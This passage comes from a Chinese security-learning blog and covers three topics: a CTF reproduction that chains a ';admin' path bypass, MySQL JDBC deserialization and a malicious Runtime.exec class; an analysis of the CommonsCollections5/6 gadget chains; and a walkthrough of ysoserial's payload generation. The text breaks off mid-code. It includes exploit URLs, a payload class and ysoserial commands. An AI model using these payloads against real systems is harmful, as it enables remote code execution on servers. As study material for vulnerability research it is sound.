<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>1.访问127.0.0.1/;admin进行绕过<br>2.利用mysqljdbc的反序列化漏洞，通过条件竞争绕过黑名单，在本地测试的时候我修改代码了省了这一步。<br>3.通过apectjweaver的链实现文件上传加载恶意类反序列换反弹shell。</p>
<p>编写poc类，编译成class文件，最后base64一下，将poc,class写入目标服务器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet; </span><br><span class="line"><span class="keyword">import</span> java.io.*; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectInputStream out)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        out.defaultReadObject(); </span><br><span class="line">&#125; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123; </span><br><span class="line">        in.defaultReadObject(); </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;1.txt&quot;</span>); &#125; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p>
<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p>
<p>上传文件poc.class，再配合jdbc反序列化。发送一个恶意类过去。这时候就会在classpath里找对应的class，触发重写的readobject。执行里面的恶意代码。</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8888/;admin/importData?databaseType=mysql&amp;jdbcUrl=jdbc:mysql://localhost:3306/test%EF%BC%9FautoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=Antictf">http://127.0.0.1:8888/;admin/importData?databaseType=mysql&amp;jdbcUrl=jdbc:mysql://localhost:3306/test？autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=Antictf</a> 成功写入文件</p>
<p>测试时在config.json中加入新的paylaod名称时字典里面掉了一个逗号导致一直报错，耽误不少时间</p>
<p>最后一步可通过两种方式实现RCE</p>
<p>1、反序列化加载恶意类。第一次反序列化的时候写入恶意类，第二次反序列化的时候反序列化该恶意类，可以执行该恶意类的readObject方法。</p>
<p>2、业务中使用class.forName，且类参数可控。比如 jdbc:mysql://x.x.x.x:3307/test?autoDeserialize5=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_URLDNS_<a target="_blank" rel="noopener" href="http://x.x.x.x/">http://x.x.x.x</a> statementInterceptors参数传入的就是一个类名，且会被传入forName方法中。</p>
<p>因为系统重装最后把环境整没了，没完整复现完但是挺有意思的学到很多东西。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/04/19/cc5%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/19/cc5%E9%93%BE/" class="post-title-link" itemprop="url">cc5链</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-19 19:17:27 / Modified: 19:49:00" itemprop="dateCreated datePublished" datetime="2021-04-19T19:17:27+08:00">2021-04-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>idea创建maven环境，拉取环境。</p>
<p>使用工具生成反序列化paylaod<br>java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections5 calc &gt; test.ser</p>
<p><img src="/2021/04/19/cc5%E9%93%BE/1.png" alt="1"></p>
<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;tes.ser&quot;</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;tes.ser&quot;</span>));</span><br><span class="line">            is.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这条链后半部分和cc1一样，前半段不同（如何触发LazyMap#get），InvokerTransformer.transfrom–&gt;ChainedTransformer.transfrom  ConstantTransformer.transfrom拿到runtime类，构造命令执行点主要分析前半部分。</p>
<p>CC5 相当于从新找了个方法接替了 AnnotationInvocationHandler 的工作，这个类就叫做 BadAttributeValueExpException</p>
<p>首先readObject复写点在BadAttributeValueExpException</p>
<p><img src="/2021/04/19/cc5%E9%93%BE/2.png" alt="2"><br>这里重写readObject方法并且会调用toString方法，并且变量valObj可控，利用类TiedMapEntry中的toString的方法</p>
<p><img src="/2021/04/19/cc5%E9%93%BE/3.png" alt="3"><br>然后会调用LazyMap.get()方法，这样就回到了cc1的后半部分，不再赘述。</p>
<p>利用链如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>
<p>需要注意的是构造payload的时候，BadAttributeValueExpException类会对val进行判断是否为空，不为空就会执行toString方法，反序列化时传入entry已经时字符串了，就不会触发toString方法了，所以选择反射的方法进行调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123; <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString(); &#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>构造poc思路</p>
<ol>
<li>以TiedMapEntry对象为参数（就是poc中的entry对象，通过反射传入的参数）声明一个BadAttributeValueExpException对象，反序列化自动调用TiedMapEntry.toString()</li>
<li>上一步的toString触发TiedMapEntry.getValue()，进而触发LazyMap.get()</li>
<li>LazyMap.get()触发ChainedTransformer.transform()实现rce</li>
</ol>
<p>cc6称为cc5的兄弟链，不同的是CC5可以通过toString方法触发getValue，CC6链就是通过hashCode方法触发getValue的。利用链如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashSet.readObject()</span><br><span class="line">               java.util.HashMap.put()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">结合两条cc链分析ysoserial实现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-03 18:15:03 / Modified: 20:16:15" itemprop="dateCreated datePublished" datetime="2021-04-03T18:15:03+08:00">2021-04-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="结合两条cc链分析ysoserial实现"><a href="#结合两条cc链分析ysoserial实现" class="headerlink" title="结合两条cc链分析ysoserial实现"></a>结合两条cc链分析ysoserial实现</h1><p>小记：之前学习了两条cc链，后续打算跟着ysoserial工具学习，看下其实现payload原理顺便巩固一下java基础</p>
<h2 id="yso-payload生成分析"><a href="#yso-payload生成分析" class="headerlink" title="yso payload生成分析"></a>yso payload生成分析</h2><p>入口函数如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratePayload</span> </span>&#123;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERNAL_ERROR_CODE = <span class="number">70</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> USAGE_CODE = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">           <span class="comment">//首先查看接受参数是否为2，不是就输出用法</span></span><br><span class="line">            <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">                     printUsage();</span><br><span class="line">                     System.exit(USAGE_CODE);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">final</span> String payloadType = args[<span class="number">0</span>];</span><br><span class="line">              <span class="keyword">final</span> String command = args[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">//判断payload是否存在。Utils为静态类，getPayloadClass获取类名</span></span><br><span class="line">            <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass =  Utils.getPayloadClass(payloadType);</span><br><span class="line">              <span class="keyword">if</span> (payloadClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                     System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType +  <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                     printUsage();</span><br><span class="line">                     System.exit(USAGE_CODE);</span><br><span class="line">                     <span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">              &#125;</span><br><span class="line">        <span class="comment">//paloadClass的值为(Class&lt;? extends ObjectPayload&gt;)  Class.forName(className);</span></span><br><span class="line">        <span class="comment">//getObject为接口方法，payload会实现该方法并传入执行的命令生成一个类实例</span></span><br><span class="line">        <span class="comment">//最后释放</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                     <span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">                     <span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">                     PrintStream out = System.out;</span><br><span class="line">                     Serializer.serialize(object, out);</span><br><span class="line">                     ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">              &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                     System.err.println(<span class="string">&quot;Error while generating or serializing  payload&quot;</span>);</span><br><span class="line">                     e.printStackTrace();</span><br><span class="line">                     System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">              &#125;</span><br><span class="line">              System.exit(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">              System.err.println(<span class="string">&quot;Y SO SERIAL?&quot;</span>);</span><br><span class="line">              System.err.println(<span class="string">&quot;Usage: java -jar ysoserial-[version]-all.jar  [payload] &#x27;[command]&#x27;&quot;</span>);</span><br><span class="line">              System.err.println(<span class="string">&quot;  Available payload types:&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              <span class="keyword">final</span> List&lt;Class&lt;? extends ObjectPayload&gt;&gt; payloadClasses =</span><br><span class="line">                     <span class="keyword">new</span> ArrayList&lt;Class&lt;? extends  ObjectPayload&gt;&gt;(ObjectPayload.Utils.getPayloadClasses());</span><br><span class="line">              Collections.sort(payloadClasses, <span class="keyword">new</span> Strings.ToStringComparator());  <span class="comment">// alphabetize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String[]&gt; rows = <span class="keyword">new</span> LinkedList&lt;String[]&gt;();</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;Authors&quot;</span>, <span class="string">&quot;Dependencies&quot;</span>&#125;);</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;-------&quot;</span>, <span class="string">&quot;-------&quot;</span>, <span class="string">&quot;------------&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;? extends ObjectPayload&gt; payloadClass : payloadClasses) &#123;</span><br><span class="line">             rows.add(<span class="keyword">new</span> String[] &#123;</span><br><span class="line">                payloadClass.getSimpleName(),</span><br><span class="line">                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)),  <span class="string">&quot;, &quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">                 Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),<span class="string">&quot;, &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String&gt; lines = Strings.formatTable(rows);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;     &quot;</span> + line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/1.png" alt="1"></p>
<p>做一个判断，使用错误则输出用法。反之则根据exp生成payload序列化数据输出</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/2.png" alt="2"></p>
<p>Utils.getPayloadClass获取类–&gt;经过if判断之后获取实例对象–&gt;将command传入实现ObjectPayload接口getObject方法中(也就是paylaod实现的该接口)–&gt;生成payload之后序列化其数据–&gt;释放对象内存</p>
<p>生成序列化数据可添加如下代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span>  IOException </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">       objOut.writeObject(obj);</span><br><span class="line">       <span class="comment">//*****************这里添加一个生产payload文件的代码</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./payload.ser&quot;</span>);</span><br><span class="line">           ObjectOutputStream ot = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">           ot.writeObject(obj);</span><br><span class="line">           ot.close();</span><br><span class="line">           fout.close();</span><br><span class="line">       &#125;<span class="keyword">catch</span> (FileNotFoundException FNFE)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;./payload.ser Not Found&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//*****************</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229108">https://www.anquanke.com/post/id/229108</a> 安全客的这篇文章分析了该工具实现以及payload如何自行编写。</p>
<h2 id="cc1-payload生成"><a href="#cc1-payload生成" class="headerlink" title="cc1 payload生成"></a>cc1 payload生成</h2><p>这里主要是了解该工具payload生成的原理以及动态代理的应用，之前分析过cc1,前面的跳过，直接看到lazyMap</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);<span class="comment">//获取实例对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);<span class="comment">//传入map类型对象和一个接口类，实现动态代理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler =  Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm  with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure>
<p>1.通过lazyMap.decorate方法获取实例对象</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/3.png" alt="3"></p>
<p>因为传入的参数是transformer类型，所以会调用第二种方法。</p>
<p>2.跟进Gadgets.createMemoitizedProxy</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/4.png" alt="4"></p>
<p>进入Gadgets类，这里调用createMemoitizedProxy方法传入一个Map类型对象和多个接口类，然后返回createProxy方法来创建动态代理对象。</p>
<p>看到createMemoizedInvocationHandler方法中会生成调用处理器，跟进Reflection类可以发现是实现反射的方法。获取ANN_INV_HANDLER_CLASS的实例。参数 ANN_INV_HANDLER_CLASS 值为 sun.reflect.annotation.AnnotationInvocationHandler. 该类是 Java 中专门用来处理注解的调用处理器 , 但 Java 中不允许直接获取该类 , 所以必须要通过反射( Reflection ) 才能拿到该类，之前分析的payload也是在该类拿到的readObject复写点。</p>
<p>但是这里有一个问题newInstance() 方法第一个参数为 Override.class</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/5.png" alt="5"></p>
<p>通过调试发现最终会传入AnnotationInvocationHandler类的构造参数var1中，要求是一个注解类，这就是需要传入的一个注解类的原因。</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/6.png" alt="6"><br>根据调试信息最后var2会传入lazyMap对象，而该类invoke方法最终会调用LazyMap.get() 方法，然后就能拼接利用链。</p>
<p>继续看final InvocationHandler handler =  Gadgets.createMemoizedInvocationHandler(mapProxy)</p>
<p>服务端会调用AnnotationInvocationHandler.readObject() 方法，AnnotationInvocationHandler.readObject() 中会调用 this.memberValues.entrySet()，this.memberValues方法值为传入的mapProxy动态代理对象，entrySet()又是Map接口即被代理的方法，调用该方法会转发到调用处理器的 invoke() 方法中。</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/7.png" alt="7"></p>
<p>该方法中</p>
<p>Object var6 = this.memberValues.get(var4);</p>
<p>this.memberValues 参数会被赋值为 LazyMap 对象，最后调用LazyMap的get方法进入利用链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原本的payload</span></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span 